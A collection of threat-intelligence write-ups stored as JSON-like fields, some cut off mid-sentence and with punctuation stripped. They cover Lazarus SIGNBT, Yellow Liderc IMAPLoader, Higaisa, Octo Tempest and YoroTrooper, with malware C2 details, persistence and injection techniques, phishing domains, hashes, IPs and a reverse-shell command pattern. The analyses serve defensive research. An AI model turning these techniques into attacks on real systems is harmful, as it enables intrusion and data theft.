        "text": "Solutions forThreatsCategories27 Oct 2023 minute readTable of ContentsAuthorsEarlier this year a software vendor was compromised by the Lazarus malware delivered through unpatched legitimate software Whats remarkable is that these software vulnerabilities were not new and despite warnings and patches from the vendor many of the vendors systems continued to use the flawed software allowing the threat actor to exploit them Fortunately a proactive response by us detected an attack on another vendor and effectively thwarted the attackers effortsUpon further investigation we discovered that the software vendor that developed the exploited software had previously fallen victim to Lazarus several times This recurring breach suggested a persistent and determined threat actor with the likely objective of stealing valuable source code or tampering with the software supply chain and they continued to exploit vulnerabilities in the companys software while targeting other software makersInfection timelineThe adversary demonstrated a high level of sophistication employing advanced evasion techniques and introducing SIGNBT malware for victim control In addition other malware found in memory included Lazarus prominent LPEClient a tool known for victim profiling and payload delivery that has previously been observed in attacks on defense contractors and the cryptocurrency industryExecutive summaryIn mid-July 2023 we detected a series of attacks on several victims who had been targeted through legitimate security software designed to encrypt web communications using digital certificates The exact method by which this software was exploited to deliver the malware remains elusive However we identified post-exploitation activity within the processes of the legitimate software In one instance while examining the memory of the compromised security software from a victims system we discovered the presence of the SIGNBT malware accompanied by a shellcode This shellcode was responsible for launching a Windows executable file directly in memoryThe actor uses various tactics to establish and maintain persistence on compromised systems These include the creation of a file called ualapidll in the system folder which is automatically loaded by the spoolsvexe process at each system boot Additionally in several instances registry entries were recorded to execute legitimate files for the purpose of malicious side-loading further ensuring a resilient persistence mechanismMethods for loading the final payloadThe loader process retrieves the first 32 bytes from tw-100a-a00-e14d9tmp and uses this data as an AES decryption key to decrypt the remaining contents Once decrypted the payload a Windows executable identified as SIGNBT is loaded directly into memory In this case the loaded payload also reads the configuration file from the same path but with a slightly different file nameInside this file is a base64-encoded string mirroring the approach used in the previous SIGNBT malware method The first 32 characters of this string serve as the AES decryption key while the subsequent data contains configuration information used by the malware This decrypted configuration data includes details such as three C2 addresses which are referred to as proxies sleep intervals version information monitored targets and various other parameters critical to the malwares operationThe majority of SIGNBT malware instances are launched through the malware loader which operates exclusively in memory Upon execution the malware begins communicating with the C2 server by sending a beacon after initialization of its configuration data In its C2 communication the malware uses distinctive strings that start with SIGNBT This unique characteristic has earned it the designation of SIGNBT In addition the malware uses different prefixes at each stage of its C2 operation to verify and maintain its activitiesThe malware employs a multi-step process to create a 24-byte value for various purposes First it generates this value with the following componentsAfter creating this 24-byte value the malware generates an additional 24 bytes of random data These two sets of 24 bytes are then XORed together using another randomly generated 24-byte key Subsequently both the resulting value and the 24-byte key are encoded with base64 Finally these encoded values are combined with either three or seven randomly generated HTTP parameter names In all future C2 communications the malware uses a similar structure making it more challenging to detect and analyze its communicationsStructure of HTTP POST dataThe malware uses a mechanism to validate the response data received from the C2 server Specifically it checks to see if the response data contains a hard-coded HTML scriptDuring the validation process the malware decodes the first 12 bytes from the C2 server using base64 replacing the spaces with plus signs to create a seven-character string This process is then repeated with the next 12 bytes The first seven characters from each set are then XORed and compared to the success string This repetitive procedure is applied to every HTTP communication sequence to verify that the response aligns with the expected success criterionNext the malware sends HTTP requests with the SIGNBTKE header and if it receives a success message from the C2 server it activates the getInfo function within the CCBrush class This function gathers various information about the victims computer such as computer name product name OS details system uptime CPU information system locale time zone network status and malware configuration data After sending this system-specific information the malware sends another HTTP request with the SIGNBTGC prefix this time using a randomly chosen embedded HTTP parameter from a list of 100 possible parameter namesThe data received from the C2 server is decrypted using AES with a decryption key obtained from a SIGNBTLG HTTP request If the decrypted data is keep the malware responds with an OK message using the SIGNBTSR prefix indicating a successful communication If there are problems the malware uses the SIGNBTFI prefix to convey the nature of the problem or failure in communication To summarize the C2 communication process can be described as followsC2 communication processIf the delivered data does not equal keep indicating that specific instructions or actions are required the malware proceeds to invoke the corresponding class and function for backdoor behavior The SIGNBT malware is equipped with an extensive set of functionalities designed to exert control over the victims system To perform these functions the malware receives instructions from the C2 server in the form of a class name function name and any necessary parameters It then executes the relevant function embedded in the malwares codebaseThe name of each backdoor command is straightforward implementing commonly used Windows commands such as ping netstat and systeminfo Its important to note that the backdoor is capable of implanting an additional payload for auto execution internally named deploy This backdoor function receives file paths via command-line arguments decrypted with AES Using this command SIGNBT has been observed to implant the phantom DLL we already described in the SIGNBT loader section aboveBased on the analysis it is evident that the actors initial compromise of the victim involved exploiting vulnerabilities within the software exploit They then proceeded to deploy the SIGNBT malware using a DLL side-loading technique Furthermore the actor used the backdoor capability deploy to implant an additional payload for automated execution This multifaceted attack demonstrates a high level of sophistication and a deliberate effort to infiltrate and maintain control over the victims systemUsing the comprehensive backdoor as described above the actor deploys additional malware in the victims memory Notably these newly delivered malware variants predominantly execute in the systems memory only without touching the disk Based on our telemetry the actor has been observed to deliver such tools as LPEClient and credential dumping utilities to the victim machinesAdditional payload delivered by SIGNBTThe infection chains of the three campaigns attributed to Lazarus in 2023The Lazarus group remains a highly active and versatile threat actor in todays cybersecurity landscape The threat actor has demonstrated a profound understanding of IT environments refining their tactics to include exploiting vulnerabilities in high-profile software This approach allows them to efficiently spread their malware once initial infections are achieved Moreover the activities of this notorious actor transcend geographic boundaries and industry sectors They have targeted various industries each with distinct objectives and using different tools tactics and techniques This underscores their recent and ongoing activity characterized by sophisticated methods and unwavering motivationsSIGNBT loader9cd90dff2d9d56654dbecdcd409e1ef3

Yellow Liderc aka Imperial Kitten Tortoiseshell TA456 Crimson Sandstorm As reported in our previous Year in Retrospect publications123 this threat actor remains an active and persistent threat to many industries and countries including the maritime shipping and logistics sectors within the Mediterranean nuclear aerospace and defence industries in the US and Europe and IT managed service providers in the Middle EastIn this blog we will cover a recently-observed sample of malware linked to Yellow Liderc that has been used alongside strategic web compromises The following are the key points of our analysisYellow Liderc is an Iran-based threat actor that has been active since at least 2018 As previously reported in our 2020 Year in Retrospect publication Yellow Liderc is an Islamic Revolutionary Guard Corp IRGC aligned threat actor which focuses on targeting Aviation Automotive Aerospace and Defense Logistics Maritime and Information Technology organisations Geographically the threat actor focuses on targeting organsiations throughout the Middle East Europe both North and South America and parts of South Asia In 2021 open source reporting documented alleged connections between the threat actor and the IRGC4which also aligns with our previous reporting5Yellow Liderc is known for a variety of tactics and techniques including phishing social engineering and strategic web compromises The threat actor uses both custom and off-the-shelf malware including PowerShell backdoors and infostealers in order to gather information about victim systems The threat actor has previously used macro enabled documents that drop a VBS script commonly referred to as LEMPO which establishes persistence performs reconnaissance and exfiltrates sensitive information The threat actor often favours exfiltration of sensitive information to an actor-controlled email account via SMTPS or IMAP and has been observed using both dedicated mailboxes and third party services for their email accounts78Since 2022 Yellow Liderc has frequently compromised legitimate websites and inserted malicious JavaScript91011often referred to as a watering hole attack or strategic web compromise The JavaScript is used by the threat actor to fingerprint website visitors by capturing user location device time of visits etc The script enables the actor to infect specific user systems matching a target fingerprint with malware and gain access to the organisations networkThis activity has heavily focused on the maritime shipping and logistics sectors within the Mediterranean Previous open source reporting has described some of this specific targeting by the threat actor1213 PwC has observed the following domains being actively used by Yellow Liderc throughout 2022 and 2023 in various watering hole attacksIn some attacks the threat actor would serve malware to their targets upon visiting the infected websites because their fingerprints apparently indicated they could be a high value target PwC observed a new sample of malware used in those later stages which we have named IMAPLoader We assess that IMAPLoader is a replacement to a Python-based IMAP implant the actor used in late 2021 and early 202214The overall functionality is similar to past malware leveraged by the threat actor but IMAPLoader uses a new injection technique not previously seen with Yellow Liderc and is detailed belowThe following sample is a DLL written in NET and acts as a downloader leveraging email communication as a means of command and control C2 communicationFilenameStreamingUXdllSHA-256989373f2d295ba1b8750fee7cdc54820aa0cb42321cec269271f0020fa5ea006File typeWin32 DLLFile size175104 bytesCreated2022-12-18 122750Figure 1 Overview of IMAPLoaders functionalityIn order to run IMAPLoader uses an injection technique known as AppDomain Manager Injection15 which was first publicly disclosed in a proof of concept in 2020 The injection forces a Microsoft NET application to load a specially crafted NET assembly IMAPLoader in this case Upon execution IMAPLoader extracts the full path to itself and makes the Windows Console Window that is created when the application is started hidden from view This is achieved by directly importing the Windows DLLs kernel32dll and user32dll and calling the GetConsoleWindow and ShowWindow APIs respectivelyThe malware then queries the IMAP accounts email addresses hardcoded in the DLL which are both decimal encoded These include two email addresses and passwords which once decoded show Yandex email addresses a common email provider used by this threat actorThe malware then runs a WMI query to determine the operating system version followed by scheduling tasks depending on the version identified One of those tasks is to check for specific mailbox folders in a folder misspelled by the threat actor Messages in the Recive folder are likely to contain further payloads as attachments IMAPLoader proceeds to compile a list of unseen messages in this folder and prepare for attachment extraction via the hard coded Yandex email addressesDepending on which Yandex account successfully logged in to a new object imapClient3 is created which can interact with the remote email By calling WMI class Win32ComputerSystemProduct IMAPLoader extracts the system UUID strings This is later converted into a SHA-256 hash value and the first 21 characters converted to uppercase are used as an identifier in any further communication with the IMAP account This likely indicates the Yandex accounts are intended for use across multiple victims in contrast to their previous Python-based IMAP implantThe briefly mentioned extraction of attachments uses the UxAttachment method to return a dictionary object where the first entry is the name of the attachment stored as a string and the second entry stores the raw attached file as a byte object The attachment is subsequently stored in the same location on disk as IMAPLoader We also observed in the code that there is a persistence mechanism via UxEditTask This method ensures persistence on the system for the new retrieved payload which we assess is likely to be a PE executable file The method is used to edit the Windows task previously created by IMAPLoader as StreamingUX Updater version number by updating the path to point to the new payloadIn the last chain of actions the new payload is executed by calling the ProcessStartInfo class Finally a new thread is created in the context of IMAPLoader which is used to fingerprint the system and exfiltrate collected content by sending an email to the same IMAP account used to retrieve the payload While we have previously observed the threat actor developing NET malware which uses similar email-based C2 channels and hard-coded commands to gain information about the victim's environment IMAPLoader is executed via the 'AppDomain Manager Injection' technique a technique we have not observed Yellow Liderc using before which shows an evolution of this threat actors tools and techniquesWe detected another sample from September 2022 which we assess is an earlier version of IMAPLoaderFilenamesaveImapMessageexeSHA-25632c40964f75c3e7b81596d421b5cefd0ac328e01370d0721d7bfac86a2e98827File typeWin32 EXEFile size170496 bytesCreated2101-11-11 010426PDB pathFvspsaveImapMessagesaveImapMessageobjDebugsaveImapMessagepdbAlthough saveImapMessageexe is an EXE file rather than a DLL this shares a similar NET file structure It also contains the same functionality as our original sample StreamingUXdll which in this case is located in a namespace called downloader We also found a NET DLL named JobTitledll which shares a partial PDB path with saveImapMessageexe Fvsp and drops a version of IMAPLoader to the victims system The infection chain for IMAPLoader is composed of three stages using a decoy Excel document and legitimate Microsoft application for injection as seen in Figure 3Figure 3 - Infection chain to deliver and execute IMAPLoaderThe first stage is distributed as an Excel-DNA XLL plugin17 an open source library that enables NET integration into Microsoft Excel files One of its resources is called JOBTITLE which stores the 2nd stage component of the multi-part infection chainAs soon as JobTitledll is executed it writes a C source code file named sourcecs to disk This is subsequently compiled into a NET DLL file called signdll a version of IMAPLoader by leveraging the native C compiler tool cscexeThree additional files extracted by JobTitledll from its resources are also written to disk a benign Microsoft Excel document a modified Microsoft Windows application and an associated configuration fileThe last DLL has the same functionality as discussed in the earlier StreamingUXdll IMAPLoader analysis The email addresses used for C2 communication also match our earlier analysis indicating the threat actor has likely reused its infrastructure for different victims As per the previous sample host fingerprinting is performed at every new payload execution by creating a new process and executing cmdexe with the same parameters as beforePivoting on the strategic web compromise infrastructure shows links to infrastructure we assess is likely used by Yellow Liderc in their phishing operations For example both ztransportorganizationilxyz and officemicrosoftsigncom shared a resolution at IP 138124183100 Many similar domains can be identified from additional pivots made on this threat actor's infrastructure that have been active since at least 2022 such as the one shown in Figure 4 Figure 4 Phishing page hosted on cheapforteststoreAll of this assessed phishing activity is likely aimed at a wider target audience rather than solely focused on the maritime or shipping sectors within the Mediterranean Some of the domains are generically themed around Microsoft accounts which can be used against a wide variety of targets while other domains are specifically aimed at the travel and hospitality sectors within Europe In some cases the threat actor is likely credential harvesting based on observations of the phishing pages being served For example Figure 5 below shows a generic Microsoft login page that Yellow Liderc is using to trick targets into entering their credentials It is assessed that the likely delivery method of this and similar domains described throughout are sent via spear phishing emails Figure 5 Phishing page hosted on loginliveformsmicrosoftofficecomoauth2liveIn other cases malware is served to targets upon visiting the phishing website For example the threat actor served a macro-enabled Excel document that drops a VBScript The use of macro-enabled documents that drop VBScripts is very similar to past Yellow Liderc activity which we have reported on privately18 alongside open source reporting19Filenameincomestatement1xlsmSHA-2561a996d98ab897bbc3a0249ea43afaf841b31396be7cbe61b443a58d1c9aab071File typeXLSMFile size3122078 bytesCreated2011-05-30Figure 6 Macro-enabled document served

organisations with the described strategic compromise tactics and phishing activity Analysis of IMAPLoader shows an evolution of the threat actor's tools which will likely continue to evolve as the

        "title": "Higaisa APT Resurfaces via Phishing Website targeting Chinese Users Cyble",
        "text": "Cyble Research and Intelligence Labs CRIL discovered a phishing website named open-vpntop on October 16th This deceptive site is designed to imitate the legitimate OpenVPN website It is suspected to be associated with a new campaign initiated by an Advanced Persistent Threat APT group called HigaisaHigaisa APT is believed to have South Korean origins and was initially disclosed by Tencent Security Threat Intelligence Center in early 2019 The groups malicious activities can be traced back to at least 2016 involving the use of Trojans such as Gh0st and PlugX as well as mobile malware Their targets encompass government officials human rights organizations and other entities associated with North KoreaPhishing websites are frequently utilized by Threat Actors TAs as their primary method for distributing malware These TAs frequently employ brand impersonation in their phishing campaigns adeptly tricking users into a false sense of trust and legitimacy ultimately enticing unsuspecting individuals Given the widespread use of VPNs by individuals to overcome online censorship it is conceivable that these TAs are specifically targeting those seeking to evade such restrictions The image below depicts the fraudulent OpenVPN websiteThe website hosted a malicious OpenVPN installer file which is bundled with a genuine OpenVPN executable and a malicious Rust-based executable Notably the Rust-based executable has a valid digital signature This digital signature is attributed to the Chinese organization Zhiya Yunke Chengdu Finance and Tax Service Co Ltd as shown belowWe have obtained a file named OpenVPNexe from the phishing website This file is a 32-bit Graphical User Interface-based executableUpon execution of the file it initiates a prompt for the user to choose their desired language as shown in the figure below It displays an installation wizard to proceed with the installation processDuring the installation the installer drops several files in the CProgram Files x86OpenVPN directory These files consist of the genuine OpenVPN MSI installer openvpnmsi two legitimate runtime DLLs vcruntime140dll vcruntime140Orgdll and an additional malicious 64-bit console-based executable file written in the Rust programming language named romexe which is a shellcode runner Then the installer file executes the malicious romexe fileThe figure below shows the files dropped by the OpenVPN executableWhen romexe is executed the malware employs Windows APIs such as FindResource LoadResource and SizeofResource to search for encrypted content stored within the executables resource section Subsequently it decrypts this content which is a Shellcode and proceeds to execute it The figure below shows the malware locating and executing the ShellcodeUpon execution the Shellcode conducts an anti-debugging check by calculating a 32-bit hash of the current code section and subsequently comparing it to the original 32-bit hash of the code section This check is designed to detect debugging attempts When a debugger is in use and a breakpoint is added the debugger inserts the opcode 0xCC at the location where the original opcode existed This alteration to the opcode disrupts the original hash of the code section If the hash does not match the Shellcode terminates itself The figure below shows the hash comparisonSubsequent to performing the anti-debugging operation the malware proceeds secondary decryption of the Shellcode using a 16-byte XOR key and executes it as shown in the figure belowAfter decryption it creates a new thread with the purpose of generating a cryptographic session key This key is intended to be sent to the CC server to establish a secure communication channelTo generate the session key the Shellcode initially utilizes the API function UUIDCreate which generates a 16-byte UUID Universally Unique Identifier This UUID will then be used for creating an AES encryption key The code responsible for creating this UUID is depicted in the figure belowAfter generating the initial UUID it proceeds to create an additional UUID The last byte of the newly created UUID is typically used to generate a byte that will be used to compute a 32-bit hash using ROR and ADD-based instructions This process is similar to the process used by shell code to compute hash at the time of anti-debugging operation This hash is then passed to the CryptBinaryToStringA API function for the purpose of generating Base64 encoded data using the second UUID as shown in the figure belowThe Shellcode employs the Windows Crypto API CryptCreateHash to generate an MD5 hash using the first UUID Subsequently the Shellcode proceeds to create a second MD5 hash this time of the previously generated hash The figure below shows the routine for creating these hashesOnce the hashes are generated the Shellcode proceeds to create a 128-bit AES encryption key using the CryptDeriveKey function The figure below shows the routine involved in creating this 128-bit AES keyThe newly generated AES key is employed to enable encrypted communication with the CC server To establish a secure connection with the CC server the Shellcode utilizes a socketFollowing the key initialization the Shellcode initiates another thread within which it establishes a socket connection and verifies the internet connectivity To determine internet availability the Shellcode evaluates connections to a predefined list of websites If any of these websites can be reached the Shellcode proceeds with additional operations The figure below shows the routine containing hardcoded URLsFollowing an internet connectivity check the Shellcode initiates communication with the CC server To facilitate this communication the Shellcode spawns additional threads Specifically it creates two additional threads that collaborate to manage the commands exchanged between the backdoor and the CC serverThe Shellcode creates a dispatch thread to handle the commands posted by the worker thread The function of the dispatch thread is to create a message queue leveraging the PeekMessageW API Then the worker thread proceeds to send the message ID alongside the command buffer to the message queue using the PostThreadMessageW APIOnce the dispatch thread receives a message from the worker thread the message is then retrieved with the help of the GetMessageW APIBased on the ID of the messages received the command handler will accordingly receive the message The figure below shows the dispatch threadThe shellcode is communicating to the IP 4324620983 whose details are mentioned belowUpon establishing a successful connection with the CC server the attacker gains the ability to take control of the victims machine perform malicious activities and deploy additional malware such as ransomware and othersCRIL also noticed three additional files engaged in communication with the CC server masquerading as GoogleMeet and ZoomInstallerTAs often hide their malware payloads within genuine software installer files for various strategic reasons This approach leverages the trust users have in legitimate software increasing the likelihood of users willingly executing these files believing them to be secure Moreover genuine software installers are frequently distributed through widely recognized channels diminishing suspicion and boosting the chances of successful infiltrationIn this case TAs are concealing a shellcode runner within the legitimate OpenVPN software application The analyzed Shellcode displays a high level of sophistication and presents a significant danger to unsuspecting users largely due to the fact that the associated files possess valid digital signatures This attribute significantly reduces the likelihood of detection at the time of writing this blogMoreover the manual nature of the malwares operation suggests that the TAs are carefully selecting their targets for more precise and specific operations This underscores the importance of user vigilance in light of the potential for further such attacks Users should remain alert to the possibility of similar threats in the

        "text": "Microsoft has published a detailed profile of a native English-speaking threat actor with advanced social engineering capabilities it tracks as Octo Tempest that targets companies in data extortion and ransomware attacksOcto Tempests attacks have steadily evolved since early 2022 expanding their targeting to organizations providing cable telecommunications email and tech services and partnering with the ALPHVBlackCat ransomware groupThe threat actor was initially observed selling SIM swaps and stealing accounts of high-profile individuals with cryptocurrency assetsIn late 2022 Octa Tempest moved to phishing social engineering resetting passwords en-masse for the customers of breached service providers and data theftEarlier this year the threat group attacked companies in the gaming hospitality retail manufacturing technology and financial sectors as well as managed service providers MSPsAfter becoming an ALPHVBlackCat affiliate Octa Tempest deployed the ransomware both to steal and to encrypt victim dataThe group used its accumulated experience to build more advanced and aggressive attacks and also started to monetize intrusions by extorting victims after stealing dataMicrosoft says that Octo Tempest also used direct physical threats in some cases to obtain logins that would advance their attackIn an odd turn of events Octo Tempest became an affiliate of the ALPHVBlackCat ransomware-as-a-service RaaS operation Microsoft says and by June they started deploying both the Windows and Linux ransomware payloads focusing on VMware ESXi servers latelyThe more recent attacks from this group target organizations in a variety of sectors including gaming natural resources hospitality consumer products retail managed service providers manufacturing law technology and financial servicesMicrosoft assesses that Octo Tempest is a well-organized group that includes members with extensive technical knowledge and multiple hand-on-keyboard operatorsThe hackers often gain initial access through advanced social engineering that targets accounts of technical administrators eg support and help desk staff with enough permissions to further the attackThey research the company to identify the targets they can impersonate to the level of mimicking the speech patterns of the individual in phone callsBy doing so they trick technical administrators into performing password resets and reset multi-factor authentication MFA methodsOther methods for initial access includeOnce they get sufficient access Octo Tempest hackers start the reconnaissance stage of the attack by enumerating hosts and services and collecting information that would permit abusing legitimate channels to progress the intrusionInitial bulk-export of users groups and device information is closely followed by enumerating data and resources readily available to the users profile within virtual desktop infrastructure or enterprise-hosted resources - MicrosoftOcto Tempest then proceeds to explore the infrastructure enumerating access and resources across cloud environments code repositories server and backup management systemsTo escalate privileges the threat actor again turns to social engineering SIM-swapping or call forwarding and initiates a self-service password reset of the targets accountDuring this step the hackers build trust with the victim by using compromised accounts and demonstrating an understanding of the companys procedures If they have a managers account they approve requests for increased permissions themselvesFor as long as they have access Octo Tempest continues to look for additional credentials to expand their reach They use tools like Jercretz and TruffleHog to automate the search for plaintext keys secrets and passwords across code repositoriesTo keep their tracks hidden the hackers also target the accounts of security personnel which allows them to disable security products and featuresUsing compromised accounts the threat actor leverages EDR and device management technologies to allow malicious tooling deploy RMM software remove or impair security products data theft of sensitive files eg files with credentials signal messaging databases etc and deploy malicious payloads - MicrosoftAccording to Microsoft Octo Tempest tries to hide their presence on the network by suppressing alerts of changes and modifying the mailbox rules to delete emails that could raise the victims suspicions of a breachThe researchers provide the following additional tools and techniques that Octo Tempest uses in their attacksThe hackers also move stolen data to their servers using a unique technique which involves Azure Data Factory and automated pipelines to blend in with typical big data operationsTo export SharePoint document libraries and transfer the files quicker the attacker has been often observed to register legitimate Microsoft 365 backup solutions such as Veeam AFI Backup and CommVaultMicrosoft notes that detecting or hunting for this threat actor in an environment is not an easy task due to the use of social engineering living-off-the-land techniques and the diverse toolingHowever the researchers provide a set of general guidelines that could help detect malicious activity which starts with monitoring and reviewing identity-related processes Azure environments and endpointsOcto Tempest is financially motivated and achieves its goals through stealing cryptocurrency data theft extortion or encrypting systems and asking for a ransom"

        "title": "Kazakhstan-associated YoroTrooper disguises origin of attacks as Azerbaijan",
        "text": "Talos assesses with high confidence that YoroTrooper operators are likely based in Kazakhstan based on their language preferences use of Kazakhstani currency and very limited targeting of Kazakhstani entities which only included the governments Anti-Corruption AgencyOur primary observation that points toward the actor being of Kazakh origin is that they speak Kazakh and Russian both of which are official languages of Kazakhstan YoroTrooper frequently visits websites written in Kazakh and has used Russian in debugging and logging messages in their custom Python remote access trojans RATs For example we have seen phrases such as savedir or n that translate to I save in savedir and File uploadednName respectively and the translation of output of commands to CP866 the code page for CyrillicStarting in June 2023 we saw this actor using Uzbek in their implants another popular language in Kazakhstan enabling us to narrow down their country of origin While this may be an attempt at generating false flags to masquerade as an Uzbek adversary it is highly likely that YoroTrooper operators are simply well-versed in Kazakh Russian and Uzbek languagesA second observation that supports our assessment of YoroTroopers strong ties to Kazakhstan is the involvement of Kazakhstani currency in their operations The threat actor primarily relies on using cryptocurrency to pay for operating infrastructure such as domains and servers for hosting their lures payloads and decoys and regularly checks for currency conversion rates between Kazakhstani Tenge KZT Kazakhstans official currency and Bitcoin BTC on GoogleThe threat actor also uses online exchanges such as alfachangecom which converts money from Kazakhstani Tenge to Bitcoin via their Visa and Mastercard cardsTalos research found that YoroTrooper has a special defensive interest in repeatedly evaluating the security posture of the website of the Kazakhstani state-owned email service mailkz YoroTrooper will regularly conduct security scans of mailkz but has never registered any look-a-like domains or created credential harvesting pages spoofing the site tactics the threat actor commonly uses when attempting to target an online service or its users The image below shows bookmarks pertaining to the evaluation of mailkzs security posture saved on a browser used by YoroTrooper indicating that the threat actor frequently visits these links to monitor the website for potential security vulnerabilitiesThis monitoring activity indicates YoroTrooper values mailkz as they have conducted similar security scanning for their own malicious infrastructure to verify that it is not vulnerable to exploitation For example YoroTrooper queried IP address 1681008242 on Shodan which hosted domain mailascoaz-linkemail on July 11 2022 that was used by YoroTrooper to target entities in Azerbaijan in November 2022YoroTrooper checking one of their own IP addresses in ShodanFinally Talos analysis of YoroTroopers victimology found that the only institution targeted in Kazakhstan was the governments Anti-Corruption Agency YoroTrooper facilitated this attack by creating a malicious subdomain mailantikorgovkzopeningfilenet that spoofed the legitimate government domain antikorgovkz We assess with high confidence that YoroTrooper made numerous efforts to disguise their origin by hosting a majority of their infrastructure in Azerbaijan while still targeting institutions in Azerbaijan using malicious sub-domains such asYoroTrooper employs numerous tactics to obfuscate the origin of their activity attempting to appear as if they are located in Azerbaijan We observed that most of YoroTroopers operations are routed via Azerbaijan though notably the threat actor does not appear to speak the Azerbaijani language Intelligence obtained by Talos indicates the adversary regularly translates information from Azerbaijani to Russian the second official language in KazakhstanYoroTrooper using Google Translate to convert text from Azerbaijani to Russian for an account verification messageFurthermore the operator drafts lures in Russian and then translates them to Azerbaijani to use in their phishing attacksYoroTrooper makes an effort to have their operations appear as if they originate from Azerbaijan looking to use VPN exit nodes in the countryFinally we have also seen the threat actor searching for random contact information for Azerbaijani individuals likely to use when setting up their infrastructure and toolsYoroTroopers targeting of government entities in these countries may indicate the operators are motivated by Kazakh state interests or working under the direction of the Kazakh government It is also possible however that the actors are simply motivated by financial gain achieved by selling restricted state information Talos is pursuing further research on YoroTroopers intelligence collection goals to ascertain the groups potential state sponsorshipA number of prominent and successful YoroTrooper intrusions took place in recent months beginning in June 2023 when the adversary compromised a Tajiki national Although we could not determine the identity of the victim Talos assesses that the victim is associated with the Tajik government based on the nature of the data that YoroTrooper exfiltrated from them which amounted to 165MB of documents Many of these documents consisted of government certificates and affidavits appearing to belong to someone who has visibility into government personnel management and welfareYoroTrooper consistently relies on vulnerability scanners such as Acunetix and open-source data from search engines such as Shodan to locate and infiltrate a targets infrastructure This exercise turned out to be extremely fruitful for YoroTrooper who from May to July 2023 successfully compromised three state-owned Tajiki and Kyrgyzstani websites and hosted malware payloads on them with some malware still being hosted as of September 2023 The first website compromised in May 2023 was tpptj which is managed by the countrys Chamber of Commerce and Industry of the Republic of TajikistanSubsequently in July YoroTrooper compromised and hosted malware on akntj another state-owned website belonging to the Drug Control Agency under the President of the Republic of Tajikistan as well as kyrgyzkomurgovkg which belongs to Kyrgyzstan's state-owned coal enterpriseYoroTrooper also compromised a user from the Ministry of Transport and Roads of the Kyrgyz Republic successfully harvesting some browser credentials from the userYoroTrooper began its campaign to target Uzbeki government entities as early as January 2023 About eight months of aggressive attack attempts yielded success in August 2023 when YoroTrooper successfully compromised a high-ranking official from the Uzbek Ministry of Energy While Talos confirmed the compromise we could not determine what data was stolen from this individualThe following timeline provides an updated view and details of various geographies targeted since June 2023TimeframeTargeted geographySalient TTPsSeptember 2023Tajikistan Used an agreement statement between Bulgaria and Tajikistan as a lure Reused compromised Tajiki website for the Chamber of Commerce and Industry to host malware Deployed PowerShell-based implants and used Telegram APIsAugust

official Reused custom-built reverse shell EXEs first seen in June 2023 Reused a PyInstaller-wrapped Python-based Google Chrome credential stealer that was first seen in January 2023 though this version did not include an upload capabilityJuly 2023Tajikistan and Kyrgyzstan Tajik Drug Control Agencys website akntj compromised to host payloads Kyrgyz state-owned coal enterprise KyrgyzKomurs website kyrgyzkomurgovkg compromised and used to host malwareJune 2023Tajikistan Takij Ministry of Foreign Affairs targeted using the following lures Publication from the International Atomic Energy Agency IAEA and OECD Nuclear Energy Agency NEA on Uranium Resources Production and Demand Used a compromised Tajiki website for the Chamber of Commerce and Industry to host malware First instance of deploying custom-built reverse shell EXEs Python implants ported to PowerShell and used Telegram APIs YoroTrooper relies heavily on learning-on-the-go to carry on their malicious activities Weve observed the operator constantly attempting to buy new tools such as VPN connections Our research also indicated that the group actively relies on vulnerability scanners such as Acunetix and open-source data such as the information available on Shodan to locate and infiltrate the public-facing servers of their targetsYoroTrooper frequently conducts open-source searches of infrastructure they are interested in targeting using search engines such as Google Shodan and Censys to find vulnerabilities and leakages in a target's infrastructure This research includes searching for vulnerable PHP-based servers and identifying content management systems CMS to find open directories Talos identified a number of operational email accounts and other infrastructure used by YoroTrooper to facilitate their operations YoroTrooper primarily uses the email address anadozzattutaio to register and purchase tools and services such as VPN accounts For example in 2022 the actors used this email address to obtain a subscription to NordVPN valid from 2022 to 2025 from darkstoresuYoroTrooper has also extensively used and maintained access to two other email addresses nayyubovatmailru and danyjackson120293atprotonme via their remote machines It is unclear if these email addresses actually belong to the operators or are just compromised accounts being leveraged by YoroTrooperA couple of months before purchasing the NordVPN account YoroTrooper configured and purchased a VPS instance from netxhosting for 16 USD a month This is likely another remote machine that the threat actor used to expand their malicious operationsTalos also found that YoroTrooper accesses their malicious infrastructure several times over the course of their campaigns in order to upload malware and access URLs hosted on their servers such as YoroTrooper regularly sends spearphishing messages to victims that direct to attacker-controlled pages designed to harvest the targets credentials The operators collect and deploy phishing pages on servers specific to a target country Some of the malicious credential-harvesting pages found on YoroTroopers VPS systems wereThe practice of credential-harvesting runs complimentary to YoroTroopers malware-based operations with the end goal being data theft The vast majority of YoroTrooper malware analyzed by Talos belongs to different families of information stealers After Talos released our report on YoroTrooper earlier this year we have seen the operators make slight adjustments to their infection chains The infection mechanisms have become more modular withWhile many of their mechanisms and implants have seen slight variation Talos assesses with high confidence that YoroTrooper is changing their final malware implants and looking to develop and adopt new malware families into their arsenalAs part of their exercise of retooling YoroTrooper has also ported their custom-built Python implants that were previously packaged into executables using frameworks such as Nuitka and PyInstaller to PowerShell scripts that are now directly run from the central HTA scriptThe new infection chain is outlined in the graphic below YoroTrooper has started using a simple custom-built Windows executable-based interactive reverse shell to run commands on infected endpoints via cmdexe Since February 2023 YoroTrooper has ported their Python-based RAT to PowerShell This is likely an attempt to reduce the footprint of the malware on the infected systems as a Python-based RAT packaged into an EXE using PyInstaller or NUITKA usually results in a binary of a few megabytes however the same code in PowerShell is only a few kilobytes and runs natively on the system The core functionality remains the same with the RAT taking commands and exfiltrating data to Telegram-based C2sPython-based RAT left vs the ported PowerShell code right In July 2023 YoroTrooper began experimenting with multiple types of delivery vehicles for their implants and adopting other malware families into their arsenalOne such example is a Windows executable that is designed to work in lieu of the entire LNK and HTA-based infection chain previously used by the actors This executable is a PyInstaller-wrapped binary where the Python code willWe found one sample from July 2023 that downloads and displays a decoy document from the KyrgyzKomur website which belongs to the coal division within the Kyrgyz Ministry of Energy This document is a memo on a transportation agreement between the Republic of Bulgaria and Tajikistan The sample consists of a mere 13 lines of Python code packed into a 6MB PyInstaller binary As recently as September 2023 YoroTrooper began using a Rust-based implant that opens an interactive reverse-shell via the commandcmdexe d c commandfromC2Their Golang-based implants are ports of the Python-based RAT that uses Telegram channels for file exfiltration and C2 communication So far we have seen the Python-based RAT already being ported to two other languages PowerShell and GolangGoLang implant checking for run command from the C2 Ways our customers can detect and block this threat are listed

